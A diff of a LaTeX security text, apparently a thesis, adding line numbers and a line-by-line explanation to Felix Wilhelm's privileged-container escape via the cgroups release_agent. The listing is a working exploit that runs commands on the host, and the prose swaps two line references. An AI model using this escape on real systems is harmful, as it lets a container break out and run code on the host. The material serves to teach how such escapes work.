@@ -8,18 +8,25 @@ An example of this, is abusing a feature in \lstinline{cgroups}~\cite{CGroup-Doc
 
 \medskip
 
-\todo[inline]{Geert: Explain using line numbers}
 We can look at a proof of concept of this attack developed by security researcher Felix Wilhelm~\cite{Felix-Wilhem-Tweet}.
-\begin{lstlisting}[caption={Privileged container escape using \lstinline{cgroups}.},captionpos=b,label={listing:privileged-escape}]
+\begin{lstlisting}[numbers=left, escapechar=@, caption={Privileged container escape using \lstinline{cgroups}.},captionpos=b,label={listing:privileged-escape}]
 (host)$ docker run -it --rm --privileged ubuntu:latest bash
-(cont)# d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
-(cont)# mkdir -p $d/w;echo 1 >$d/w/notify_on_release
-(cont)# t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
-(cont)# touch /o; echo $t/c >$d/release_agent;printf '#!/bin/sh\nps >'"$t/o" >/c;
-(cont)# chmod +x /c;sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o
+(cont)# d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`@\label{line:privileged:d}@
+(cont)# mkdir -p $d/w@\label{line:privileged:w}@
+(cont)# echo 1 >$d/w/notify_on_release@\label{line:privileged:enable_release_agent}@
+(cont)# t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`@\label{line:privileged:t}@
+(cont)# touch /o
+(cont)# echo $t/c >$d/release_agent@\label{line:privileged:release_agent}@
+(cont)# printf '#!/bin/sh\nps >'"$t/o" >/c@\label{line:privileged:c}@
+(cont)# chmod +x /c
+(cont)# sh -c "echo 0 >$d/w/cgroup.procs"@\label{line:privileged:procs}@
+(cont)# sleep 1
+(cont)# cat /o
 \end{lstlisting}
 
-The proof of concept in \autoref{listing:privileged-escape} first creates a new \lstinline{cgroup}, defines a \lstinline{release_agent} and releases the \lstinline{cgroup}. In this case the \lstinline{release_agent} runs the \lstinline{ps} command on the host and writes the output to \lstinline{/o} in the container.
+The proof of concept in \autoref{listing:privileged-escape} is a bit hard to read, because it uses a lot of \lstinline{Bash} syntax to abbreviate the commands. We will go over the commands line by line to see what each line does.
+
+On \autoref{line:privileged:d}, the first \lstinline{cgroup} with a \lstinline{release_agent} is added to variable \lstinline{d}. A subgroup \lstinline{w} is added to the \lstinline{cgroup} of \lstinline{d} (\autoref{line:privileged:w}) and the execution of the \lstinline{release_agent} is enabled for \lstinline{w} (\autoref{line:privileged:enable_release_agent}). The location of the container filesystem on the host filesystem is added to variable \lstinline{t} (\autoref{line:privileged:t}). A script (\lstinline{/c}), containing only the line ``\lstinline{ps > $t/o}'', is created (\autoref{line:privileged:release_agent}) and is added as the \lstinline{release_agent} (\autoref{line:privileged:c}). A process is started to add itself to the \lstinline{w} (by writing ``0'' to the \lstinline{cgroup.procs} file of \lstinline{w}) on \autoref{line:privileged:procs}. After the \lstinline{release_agent} (\lstinline{/c}) is executed, we can see all the processes on the host in \lstinline{/o}.
 
 \medskip
 
